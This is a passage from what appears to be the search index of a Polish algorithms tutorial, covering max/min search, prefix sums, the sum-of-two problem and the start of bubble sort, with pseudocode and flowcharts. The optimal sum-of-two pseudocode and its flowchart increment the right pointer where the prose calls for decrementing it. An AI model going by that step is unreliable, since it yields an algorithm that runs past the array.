FA\u0141SZ --&gt; K2i\n    K2 -- FA\u0141SZ --&gt; K5[\\Zwr\u00f3\u0107 max\\]\n    K5 ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/min-or-max/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Podobnie jak w przypadku wyszukiwania liniowego przegl\u0105damy elementy jeden po drugim w poszukiwaniu maksimum. Dlatego i w tym przypadku mamy z\u0142o\u017cono\u015b\u0107 liniow\u0105.</p> <p>\\(O(n)\\) - liniowa</p>"},{"location":"algorithms/searching/min-or-max/#wyszukiwanie-indeksu-wartosci-maksymalnej-w-tablicy","title":"Wyszukiwanie indeksu warto\u015bci maksymalnej w tablicy","text":"<p>W niekt\u00f3rych sytuacjach nie wystarczy nam zna\u0107 warto\u015b\u0107 maksymalnego elementu, musimy tak\u017ce pozna\u0107 jego pozycj\u0119 w tablicy. Zmodyfikujmy wi\u0119c odpowiednio specyfikacj\u0119 naszego problemu.</p>"},{"location":"algorithms/searching/min-or-max/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"algorithms/searching/min-or-max/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, ilo\u015b\u0107 element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) - tablica \\(n\\) warto\u015bci ca\u0142kowitych</li> </ul>"},{"location":"algorithms/searching/min-or-max/#wynik_1","title":"Wynik","text":"<ul> <li>Indeks najwi\u0119kszej warto\u015bci z tablicy \\(A\\) </li> </ul>"},{"location":"algorithms/searching/min-or-max/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/min-or-max/#dane_3","title":"Dane","text":"<pre><code>n := 8\nA := [6, 5, 3, 1, 8, 7, 2, 4]\n</code></pre> <p>Wynik: \\(5\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Najwi\u0119ksza warto\u015b\u0107 w tablicy to \\(8\\). Warto\u015b\u0107 ta znajduje si\u0119 na pozycji pi\u0105tej.</p>"},{"location":"algorithms/searching/min-or-max/#rozwiazanie_1","title":"Rozwi\u0105zanie","text":"<p>Nowy problem jest bardzo zbli\u017cony do poprzedniego, wi\u0119c aby go rozwi\u0105za\u0107, rozszerzymy nasze poprzednie rozwi\u0105zanie. Teraz, poza warto\u015bci\u0105 maksymalnego elementu, potrzebujemy zapami\u0119ta\u0107 dodatkow\u0105 informacj\u0119: indeks elementu maksymalnego. W tym celu dodajemy now\u0105 zmienn\u0105, w kt\u00f3rej zapami\u0119tamy ten indeks.  Na pocz\u0105tku, gdy jako potencjalne maksimum przyjmujemy warto\u015b\u0107 pierwszego elementu tablicy, musimy tak\u017ce indeks ustawi\u0107 na warto\u015b\u0107 \\(1\\), czyli pozycj\u0119 naszego dotychczasowego maksimum.</p> <p>Jest jeszcze jedno miejsce, w kt\u00f3rym powinni\u015bmy pami\u0119ta\u0107 o zmianie zapami\u0119tanego indeksu. Za ka\u017cdym razem, gdy znajdziemy wi\u0119ksz\u0105 warto\u015b\u0107 i zaktualizujemy nasze dotychczasowe maksimum, aktualizujemy tak\u017ce indeks tego maksimum.</p> <p>Na ko\u0144cu, po sprawdzeniu wszystkich element\u00f3w tablicy, wystarczy zwr\u00f3ci\u0107 jako wynik zapami\u0119tany indeks.</p> <p>Zapiszmy teraz nasz algorytm w postaci pseudokodu.</p>"},{"location":"algorithms/searching/min-or-max/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SzukajIndeksMaks(n, A):\n    1. max := A[1]\n    2. ind := 1\n    3. Od i := 2 do n, wykonuj:\n        4. Je\u017celi max &lt; A[i], to:\n            5. max := A[i]\n            6. ind := i\n\n    7. Zwr\u00f3\u0107 ind\n</code></pre>"},{"location":"algorithms/searching/min-or-max/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajIndeksMaks(n, A)\"]) --&gt; K1[\"max := A[1]\n    ind := 1\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= n}\n    K2 -- PRAWDA --&gt; K3{\"max &lt; A[i]\"}\n    K3 -- PRAWDA --&gt; K4[\"max := A[i]\n    ind := i\"]\n    K4 --&gt; K2i[i := i + 1]\n    K2i --&gt; K2\n    K3 -- FA\u0141SZ --&gt; K2i\n    K2 -- FA\u0141SZ --&gt; K5[\\Zwr\u00f3\u0107 ind\\]\n    K5 ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/min-or-max/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Dodanie nowej zmiennej, w kt\u00f3rej pami\u0119tamy indeks wyszukiwanego elementu, nie wp\u0142ywa na z\u0142o\u017cono\u015b\u0107 naszego rozwi\u0105zania. Struktura algorytmu pozostaje niezmieniona, wi\u0119c z\u0142o\u017cono\u015b\u0107 ca\u0142y czas jest liniowa.</p> <p>\\(O(n)\\) - liniowa</p>"},{"location":"algorithms/searching/min-or-max/#wyszukiwanie-elementu-minimalnego-w-tablicy","title":"Wyszukiwanie elementu minimalnego w tablicy","text":"<p>W przypadku poszukiwania elementu minimalnego, post\u0119pujemy praktycznie identycznie jak przy poszukiwaniu elementu maksymalnego. W zasadzie wystarczy zmieni\u0107 znak por\u00f3wnania: z \\(&lt;\\) na \\(&gt;\\). Zaprojektowanie rozwi\u0105zania zostawiamy jako samodzielne \u0107wiczenie dla zainteresowanych.</p>"},{"location":"algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/min-or-max/#c","title":"C++","text":""},{"location":"algorithms/searching/min-or-max/#python","title":"Python","text":""},{"location":"algorithms/searching/min-or-max/#blockly","title":"Blockly","text":""},{"location":"algorithms/searching/min-or-max/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/min-or-max/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/min-or-max/#_1","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"algorithms/searching/min-or-max/#haskell","title":"Haskell","text":""},{"location":"algorithms/searching/min-or-max/#julia","title":"Julia","text":""},{"location":"algorithms/searching/prefix-sum/","title":"Sumy prefiksowe","text":"<p>Czasami bywa tak, \u017ce musimy policzy\u0107 sum\u0119 pewnego sp\u00f3jnego fragmentu tablicy, a nawet kilku. Jak to zrobi\u0107 w spos\u00f3b efektywny? Je\u017celi zawarto\u015b\u0107 tablicy nie b\u0119dzie ulega\u0142a zmianom, to z pomoc\u0105 przyjd\u0105 nam sumy prefiksowe.</p>"},{"location":"algorithms/searching/prefix-sum/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/prefix-sum/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w tablicy.</li> <li>\\(A[1..n]\\) \u2014 \\(n-elementowa\\) tablica liczb ca\u0142kowitych, indeksowana od jedynki.</li> <li>\\(m\\) \u2014 liczba naturalna, liczba zapyta\u0144.</li> <li>\\(P[1..m][1..2]\\) - dwuwymiarowa tablica liczb naturalnych z zakresu \\([1..n]\\), zapyta\u0144 o sumy przedzia\u0142\u00f3w, gdzie \\(P[i][1]\\) to pocz\u0105tek \\(i\\)-tego przedzia\u0142u, a \\(P[i][2]\\) to jego koniec.</li> </ul>"},{"location":"algorithms/searching/prefix-sum/#wynik","title":"Wynik","text":"<ul> <li>\\(m\\) liczb naturalnych, dla ka\u017cdego zapytania \\(i\\) suma warto\u015bci pod indeksami od \\(P[i][1]\\) do \\(P[i][2]\\), tzn. \\(A[P[i][1]] + A[P[i][1] + 1] + A[P[i][1] + 2] + ... + A[P[i][2]]\\).</li> </ul>"},{"location":"algorithms/searching/prefix-sum/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/prefix-sum/#dane_1","title":"Dane","text":"<pre><code>n := 10\nA[1..10] := [4, 8, 2, 6, 1, 0, 8, 4, 2, 3]\nm := 3\nP[1..3][1..2] := [[3, 5], [6, 7], [1, 1]]\n</code></pre>"},{"location":"algorithms/searching/prefix-sum/#wynik_1","title":"Wynik","text":"<pre><code>9\n8\n4\n</code></pre> <p>Info</p> <p>Wyja\u015bnienie</p> <ul> <li>\\(sum_1 = A[3] + A[4] + A[5] = 2 + 6 + 1 = 9\\)</li> <li>\\(sum_2 = A[6] + A[7] = 0 + 8 = 8\\)</li> <li>\\(sum_3 = A[1] = 4\\)</li> </ul>"},{"location":"algorithms/searching/prefix-sum/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Rozwi\u0105zanie naiwne jest proste. Wystarczy dla ka\u017cdego zapytania policzy\u0107 sum\u0119 przedzia\u0142u przechodz\u0105c kolejno po elementach tablicy pod indeksami znajduj\u0105cymi si\u0119 w przedziale. Mo\u017cemy to zrobi\u0107 za pomoc\u0105 zwyk\u0142ej p\u0119tli iteracyjnej, dodaj\u0105c kolejne elementy tablicy do liczonej sumy.</p>"},{"location":"algorithms/searching/prefix-sum/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SumyPrzedzialow(n, A, m, P):\n    1. Od i := 1 do m, wykonuj:\n        2. suma := 0\n        3. Od j := P[i][1] do P[i][2], wykonuj:\n            4. suma := suma + A[j]\n        5. Wypisz suma\n</code></pre>"},{"location":"algorithms/searching/prefix-sum/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SumyPrzedzialow(n, A, m, P)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= m}\n    K1 -- PRAWDA --&gt; K2[\"suma := 0\n    j := P[i][1]\"]\n    K2 --&gt; K3{\"j &lt;= P[i][2]\"}\n    K3 -- PRAWDA --&gt; K4[\"suma := suma + A[j]\"]\n    K4 --&gt; K3i[j := j + 1]\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K5[/Wypisz suma/]\n    K5 --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/prefix-sum/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>Innym sposobem jest przygotowanie sobie tablicy pomocniczej, kt\u00f3ra pos\u0142u\u017cy nam do szybkiego obliczania sumy zadanego przedzia\u0142u. Pytanie brzmi, jak taka tablica powinna wygl\u0105da\u0107? Najpierw przyjmijmy prostsz\u0105 wersj\u0119 problemu: b\u0119dziemy podawa\u0107 sumy jedynie dla przedzia\u0142\u00f3w, kt\u00f3re zaczynaj\u0105 si\u0119 od pocz\u0105tku tablicy. Przy takim za\u0142o\u017ceniu, mo\u017cemy \u0142atwo przygotowa\u0107 tablic\u0119 pomocnicz\u0105. Wystarczy, \u017ce b\u0119dziemy sumowa\u0107 kolejne elementy od lewej do prawej. W ten spos\u00f3b, na i-tej pozycji naszej pomocniczej tablicy b\u0119dzie znajdowa\u0142a si\u0119 suma element\u00f3w od pierwszego do i-tego.</p> <p>Czy mo\u017cemy jednak skorzysta\u0107 z takiej tablicy, by obliczy\u0107 sum\u0119 dowolnego przedzia\u0142u? Okazuje si\u0119, \u017ce tak. To jednak pozostawmy jako \u0107wiczenie.</p>"},{"location":"algorithms/searching/prefix-sum/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SumyPrzedzialow(n, A, m, P):\n    1. pref := [0..n]\n    2. pref[0] := 0\n    3. Od i := 1 do n, wykonuj:\n        4. pref[i] := pref[i - 1] + A[i]\n    5. Od i := 1 do m, wykonuj:\n        6. suma := pref[P[i][2]] - pref[P[i][1] - 1]\n        7. Wypisz suma\n</code></pre>"},{"location":"algorithms/searching/prefix-sum/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SumyPrzedzialow(n, A, m, P)\"]) --&gt; K1[\"pref := [0..n]\n    pref[0] := 0\"]\n    K1 --&gt; K3{i &lt;= n}\n    K3 -- PRAWDA --&gt; K4[\"pref[i] := pref[i - 1] + A[i]\"]\n    K4 --&gt; K3i[i := i + 1]\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K5p[i := 1]\n    K5p --&gt; K5{i &lt;= m}\n    K5 -- PRAWDA --&gt; K6[\"suma := pref[P[i][2]] - pref[P[i][1] - 1]\"]\n    K6 --&gt; K7[/Wypisz suma/]\n    K7 --&gt; K5i[i := i + 1]\n    K5i --&gt; K5\n    K5 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/searching/prefix-sum/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/prefix-sum/#c","title":"C++","text":""},{"location":"algorithms/searching/prefix-sum/#python","title":"Python","text":""},{"location":"algorithms/searching/prefix-sum/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/prefix-sum/#_1","title":"Sumy prefiksowe","text":""},{"location":"algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":"<p>Mamy pewien posortowany zbi\u00f3r r\u00f3\u017cnych liczb. W tym zbiorze mamy odnale\u017a\u0107 dwie liczby, kt\u00f3re po dodaniu do siebie dadz\u0105 po\u017c\u0105dan\u0105 sum\u0119. Oczywi\u015bcie, takie liczby wcale nie musz\u0105 w tym zbiorze si\u0119 znajdowa\u0107.</p> <p>Problem mo\u017ce wydawa\u0107 si\u0119 do\u015b\u0107 abstrakcyjny i s\u0142abo zwi\u0105zany z rzeczywisto\u015bci\u0105. Niemniej jest to \u015bwietny problem do zaprezentowania, jak pomocne czasem jest pracowanie z danymi posortowanymi i jak du\u017cy wp\u0142yw mo\u017ce mie\u0107 na z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 rozwi\u0105zania.</p> <p>Zacznijmy od formalnej specyfikacji problemu.</p>"},{"location":"algorithms/searching/sum-of-two/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/searching/sum-of-two/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczebno\u015b\u0107 zbioru</li> <li>\\(A[1..n]\\) - \\(n-elementowa\\) tablica r\u00f3\u017cnych liczb ca\u0142kowitych, posortowana rosn\u0105co, indeksowana od jedynki</li> <li>\\(k\\) - liczba naturalna, szukana suma</li> </ul>"},{"location":"algorithms/searching/sum-of-two/#wynik","title":"Wynik","text":"<ul> <li>\\(a, b\\) - dwie r\u00f3\u017cne warto\u015bci ze zbioru \\(A\\) takie, \u017ce ich suma wynosi \\(k\\) (\\(a+b=k\\)), lub \\(-1\\), je\u017celi takich liczb nie ma w zbiorze (je\u017celi takich par jest wiele, to dowolna z nich)</li> </ul>"},{"location":"algorithms/searching/sum-of-two/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/searching/sum-of-two/#dane_1","title":"Dane","text":"<pre><code>n := 10\nA[1..10] := [1, 2, 4, 6, 8, 9, 10, 12, 13, 15]\nk := 18\n</code></pre> <p>Wynik: \\(6,\\ 12\\)(lub \\(8,\\ 10\\))</p>"},{"location":"algorithms/searching/sum-of-two/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Zacznijmy od pierwszego rozwi\u0105zania, jakie nam przychodzi do g\u0142owy. Naszym celem jest znalezienie pary liczb, kt\u00f3re daj\u0105 po\u017c\u0105dan\u0105 sum\u0119. W takim razie sprawd\u017amy wszystkie pary i zobaczmy, czy znajdziemy to czego szukamy.</p> <p>Przechodzimy dwiema zagnie\u017cd\u017conymi p\u0119tlami przez tablic\u0119. Zewn\u0119trzna p\u0119tla b\u0119dzie wskazywa\u0107 nam indeks pierwszego elementu z pary, a wewn\u0119trzna p\u0119tla b\u0119dzie wskazywa\u0107 drugiego elementu z pary. W celu unikni\u0119cia powt\u00f3rze\u0144 warto zadba\u0107 o odpowiedni\u0105 konstrukcj\u0119 wewn\u0119trznej p\u0119tli. Zasada jest bardzo prosta: wewn\u0119trzna p\u0119tla zaczyna poszukiwania zawsze od kolejnego elementu wzgl\u0119dem zewn\u0119trznej p\u0119tli.</p> <p>Spr\u00f3bujmy przela\u0107 nasze rozumowania na pseudokod.</p>"},{"location":"algorithms/searching/sum-of-two/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SumaDwoch(n, A, k):\n    1. Dla i := 1 do n - 1, wykonuj:\n        2. Dla j := i + 1 do n, wykonuj:\n            3. Je\u017celi A[i] + A[j] = k, to:\n                4. Zwr\u00f3\u0107 A[i], A[j]\n    5. Zwr\u00f3\u0107 -1\n</code></pre>"},{"location":"algorithms/searching/sum-of-two/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SumaDwoch(n, A, k)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt; n}\n    K1 -- PRAWDA --&gt; K2p[j := i + 1]\n    K2p --&gt; K2{j &lt;= n}\n    K2 -- PRAWDA --&gt; K3{\"A[i] + A[j] = k\"}\n    K3 -- PRAWDA --&gt; K4[/\"Zwr\u00f3\u0107 A[i], A[j]\"/]\n    K4 --&gt; STOP([STOP])\n    K3 -- FA\u0141SZ --&gt; K2i[j := j + 1]\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K6[/Zwr\u00f3\u0107 -1/]\n    K6 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/sum-of-two/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) - kwadratowa</p>"},{"location":"algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>W poprzednim rozwi\u0105zaniu ca\u0142kowicie pomin\u0119li\u015bmy fakt, \u017ce nasza tablica jest posortowana. Zastan\u00f3wmy si\u0119 wi\u0119c, jak mo\u017cemy skorzysta\u0107 z tego, \u017ce liczby s\u0105 u\u0142o\u017cone od najmniejszej do najwi\u0119kszej.</p> <p>Spr\u00f3bujmy do tego podej\u015b\u0107 w nast\u0119puj\u0105cy spos\u00f3b. We\u017amy pierwszy i ostatni element z tablicy. Wiemy, \u017ce s\u0105 to odpowiednio najmniejszy i najwi\u0119kszy element w tablicy. Obliczmy ich sum\u0119. Co mo\u017cemy stwierdzi\u0107 na jej podstawie? Por\u00f3wnajmy j\u0105 z poszukiwan\u0105 warto\u015bci\u0105. Mamy trzy opcje:</p> <ul> <li>suma jest r\u00f3wna poszukiwanej warto\u015bci: klepiemy si\u0119 po plecach i zwracamy wynik, praca zako\u0144czona,</li> <li>suma jest mniejsza od poszukiwanej warto\u015bci: musimy szuka\u0107 wi\u0119kszej sumy, w tym celu bierzemy kolejny element z lewej strony tablicy (czyli wi\u0119kszy),</li> <li>suma jest wi\u0119ksza od poszukiwanej warto\u015bci: musimy szuka\u0107 mniejszej sumy, w tym celu bierzemy kolejny element z prawej strony tablicy (czyli mniejszy).</li> </ul> <p>I tak post\u0119pujemy w p\u0119tli, a\u017c znajdziemy (albo i nie) poszukiwan\u0105 sum\u0119.</p> <p>Spr\u00f3bujmy to zapisa\u0107 w pseudokodzie.</p>"},{"location":"algorithms/searching/sum-of-two/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja SumaDwoch(n, A, k):\n    1. lewy := 1\n    2. prawy := n\n    3. Dop\u00f3ki lewy &lt; prawy oraz A[lewy] + A[prawy] != k, wykonuj:\n        4. Je\u017celi A[lewy] + A[prawy] &lt; k, to:\n            5. lewy := lewy + 1\n        6. w przeciwnym przypadku:\n            7. prawy := prawy + 1\n    8. Je\u017celi lewy &lt; prawy, to:\n        9. Zwr\u00f3\u0107 A[lewy], A[prawy]\n    10. w przeciwnym przypadku:\n        11. Zwr\u00f3\u0107 -1\n</code></pre>"},{"location":"algorithms/searching/sum-of-two/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SumaDwoch(n, A, k)\"]) --&gt; K1[\"lewy := 1\n    prawy := n\"]\n    K1 --&gt; K3{\"lewy &lt; prawy\n    oraz\n    A[lewy] + A[prawy] != k\"}\n    K3 -- PRAWDA --&gt; K4{\"A[lewy] + A[prawy] &lt; k\"}\n    K4 -- PRAWDA --&gt; K5[lewy := lewy + 1]\n    K5 --&gt; K3\n    K4 -- FA\u0141SZ --&gt; K7[prawy := prawy + 1]\n    K7 --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K8{lewy &lt; prawy}\n    K8 -- PRAWDA --&gt; K9[/\"Zwr\u00f3\u0107 A[lewy], A[prawy]\"/]\n    K9 --&gt; STOP([STOP])\n    K8 -- FA\u0141SZ --&gt; K11[/Zwr\u00f3\u0107 -1/]\n    K11 --&gt; STOP</code></pre>"},{"location":"algorithms/searching/sum-of-two/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) - liniowa</p>"},{"location":"algorithms/searching/sum-of-two/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/searching/sum-of-two/#c","title":"C++","text":""},{"location":"algorithms/searching/sum-of-two/#python","title":"Python","text":""},{"location":"algorithms/searching/sum-of-two/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/searching/sum-of-two/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/searching/sum-of-two/#_1","title":"Suma dw\u00f3ch liczb","text":""},{"location":"algorithms/searching/sum-of-two/#haskell","title":"Haskell","text":""},{"location":"algorithms/sorting/","title":"Sortowanie","text":"<p>Zdarza si\u0119, \u017ce czasem musimy co\u015b u\u0142o\u017cy\u0107 w zadanej kolejno\u015bci. M\u00f3wi\u0105c inaczej, musimy co\u015b posortowa\u0107. Powod\u00f3w mo\u017ce by\u0107 wiele. By\u0107 mo\u017ce potrzebujemy uporz\u0105dkowanego ci\u0105gu danych, aby m\u00f3c na nim wykonywa\u0107 efektywne algorytmy, np. wyszukiwania? A mo\u017ce po chcemy u\u0142atwi\u0107 \u017cycie klientowi i zaprezentowa\u0107 mu posortowan\u0105 pod wzgl\u0119dem ceny list\u0119 produkt\u00f3w na stronie? A mo\u017ce po prostu lubimy z dum\u0105 patrze\u0107 na nasz\u0105 kolekcj\u0119 ksi\u0105\u017cek uporz\u0105dkowan\u0105 po nazwiskach autor\u00f3w? Bez wzgl\u0119du na to, jaki jest nasz pow\u00f3d, warto jest zna\u0107 kilka algorytm\u00f3w/metod sortowania, aby m\u00f3c je zastosowa\u0107, nie tylko na komputerze, ale tak\u017ce i w \u017cyciu codziennym.</p> <p>Zapoznaj\u0105c si\u0119 z algorytmami sortowania zawartymi w tej sekcji przekonasz si\u0119, \u017ce przynajmniej kilka z nich swoj\u0105 intuicj\u0119 ma silnie powi\u0105zan\u0105 z otaczaj\u0105cym nas \u015bwiatem. Zastanawia\u0142e\u015b si\u0119 kiedy\u015b, drogi czytelniku, jak poruszaj\u0105 si\u0119 b\u0105belki w napojach gazowanych? A mo\u017ce zwr\u00f3ci\u0142e\u015b uwag\u0119 na to, jak uk\u0142ada\u0107 sobie karty na r\u0119ce podczas rozgrywki w bryd\u017ca? A mo\u017ce zdarzy\u0142o Ci si\u0119 porz\u0105dkowa\u0107 stos ksi\u0105\u017cek na p\u00f3\u0142ce? To wszystko, jak si\u0119 przekonasz, ma swoje odzwierciedlenie w algorytmice.</p> <p>Istnieje wiele algorytm\u00f3w sortowania. Jedne prostsze, inne trudniejsze. Jedne wolniejsze, inne wydajniejsze. Om\u00f3wimy tylko wybrane i, by\u0107 mo\u017ce, popularniejsze z tych algorytm\u00f3w. Poni\u017csza animacja w ciekawy spos\u00f3b pokazuje por\u00f3wnanie kilku algorytm\u00f3w sortowania pod wzgl\u0119dem wydajno\u015bci. Warto do niej zajrze\u0107 i po\u015bwi\u0119ci\u0107 chwil\u0119, na prze\u015bledzenie przebiegu poszczeg\u00f3lnych metod, zanim przejdziesz dalej.</p> <p>Por\u00f3wnanie algorytm\u00f3w sortowania</p>"},{"location":"algorithms/sorting/#specyfikacja","title":"Specyfikacja","text":"<p>W naszych algorytmach sortowania b\u0119dziemy trzyma\u0107 si\u0119 poni\u017cszej specyfikacji danych wej\u015bciowych i wyniku. Niekt\u00f3re algorytmy, np. ze wzgl\u0119du na swoj\u0105 rekurencyjn\u0105 natur\u0119, b\u0119d\u0105 potrzebowa\u0142y jeszcze dodatkowych parametr\u00f3w, ale og\u00f3lny schemat pozostaje ten sam, nie b\u0119dziemy wi\u0119c go powiela\u0107 przy omawianiu ka\u017cdego algorytmu.</p>"},{"location":"algorithms/sorting/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, ilo\u015b\u0107 element\u00f3w w tablicy</li> <li>\\(A[1..n]\\) \u2014 tablica \\(n\\) warto\u015bci ca\u0142kowitych</li> </ul>"},{"location":"algorithms/sorting/#wynik","title":"Wynik","text":"<ul> <li>Posortowana niemalej\u0105co tablica \\(A\\)</li> </ul>"},{"location":"algorithms/sorting/bubble-sort/","title":"Sortowanie b\u0105belkowe","text":"<p>Sortowanie b\u0105belkowe jest jednym z najprostszych w implementacji algorytm\u00f3w sortowania. Sama metoda opiera si\u0119 na prostej intuicji. Wyobra\u017amy sobie b\u0105belki powietrza, kt\u00f3re przemieszczaj\u0105 si\u0119 pod wod\u0105. Ci\u0119\u017csze b\u0105belki spadaj\u0105 na d\u00f3\u0142, a l\u017cejsze lec\u0105 do g\u00f3ry. Podobnie mo\u017cemy post\u0105pi\u0107 z liczbami: mniejsze (l\u017cejsze) liczby przemieszczamy do g\u00f3ry, a wi\u0119ksze (ci\u0119\u017csze) przemieszczamy na d\u00f3\u0142. Oczywi\u015bcie zamiast g\u00f3ra/d\u00f3\u0142 mo\u017cemy tak\u017ce m\u00f3wi\u0107 lewo/prawo co bardziej odpowiada li\u015bcie liczb zapisanej w programie.</p> <p>Poni\u017cej znajdziesz animacje przedstawiaj\u0105ce ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/bubble-sort/#animacja-1","title":"Animacja 1","text":""},{"location":"algorithms/sorting/bubble-sort/#animacja-2","title":"Animacja 2","text":"<p>Sortowanie b\u0105belkowe</p>"},{"location":"algorithms/sorting/bubble-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/bubble-sort/#rozwiazanie-1-naiwne","title":"Rozwi\u0105zanie 1: naiwne","text":"<p>Istnieje kilka sposob\u00f3w na implementacj\u0119 algorytmu sortowania b\u0105belkowego: mniej i bardziej wydajne. Zaczniemy od najprostszej, ale tak\u017ce najmniej efektywnej wersji algorytmu. Na pocz\u0105tek zauwa\u017cmy, co jest g\u0142\u00f3wn\u0105 operacj\u0105 w tej metodzie: por\u00f3wnywanie s\u0105siednich element\u00f3w i ewentualna zamiana ich miejscami. Tak, w tym sortowaniu wykorzystujemy tak naprawd\u0119 tylko jedn\u0105 operacj\u0119, powtarzan\u0105 wielokrotnie. B\u0119dziemy por\u00f3wnywa\u0107 dwa s\u0105siednie elementy, by sprawdzi\u0107, czy s\u0105 u\u0142o\u017cone we w\u0142a\u015bciwej kolejno\u015bci. Gdy napotkamy warto\u015bci, kt\u00f3re s\u0105 w niew\u0142a\u015bciwej kolejno\u015bci, to zamieniamy je miejscami. I tak sprawdzamy wszystkie pary s\u0105siednich element\u00f3w, tzn. najpierw por\u00f3wnujemy dwa pierwsze, potem drugi z trzecim, trzeci z czwartym itd. W ten spos\u00f3b przechodzimy od pocz\u0105tku do ko\u0144ca naszej tablicy element\u00f3w. Oczywi\u015bcie w trakcie naszego por\u00f3wnywania elementy mog\u0105 zmienia\u0107 swoje miejsce.</p> <p>Zastan\u00f3wmy si\u0119 teraz, ile razy takie przej\u015bcie przez ca\u0142\u0105 tablic\u0119, por\u00f3wnywanie s\u0105siednich element\u00f3w i ich ewentualn\u0105 zamian\u0119 miejscami, musimy powt\u00f3rzy\u0107. Spr\u00f3bujmy ponownie wyobrazi\u0107 sobie b\u0105belki opadaj\u0105ce na dno. Po pierwszym takim przej\u015bciu najci\u0119\u017cszy b\u0105belek (czyli najwi\u0119ksza liczba) opadnie na samo dno (czyli przemie\u015bci si\u0119 na koniec tablicy). Dlaczego? Skoro jest to najwi\u0119ksza warto\u015b\u0107, to znaczy, \u017ce zawsze w por\u00f3wnaniu z innymi elementami tablicy b\u0119dzie od nich wi\u0119ksza. A skoro tak, to znaczy, \u017ce powinna znale\u017a\u0107 si\u0119 po prawej stronie. B\u0119dziemy wi\u0119c przemieszcza\u0107 taki element w prawo przy kolejnych por\u00f3wnaniach i zamianach, a\u017c znajdzie si\u0119 na ko\u0144cu tablicy. Podobnie stanie si\u0119 z drugim najwi\u0119kszym elementem przy drugim przej\u015bciu itd. Oznacza to, \u017ce po ka\u017cdym przej\u015bciu przez ca\u0142\u0105 tablic\u0119 co najmniej jeden element znajdzie si\u0119 na w\u0142a\u015bciwym miejscu na ko\u0144cu tablicy. Skoro tak, to wystarczy takich przej\u015b\u0107 wykona\u0107 tyle, ile mamy element\u00f3w w tablicy, czyli \\(n\\).</p>"},{"location":"algorithms/sorting/bubble-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieB\u0105belkowe(n, A):\n    1. Dla i := 1 do n, wykonuj:\n        2. Dla j := 1 do n - 1, 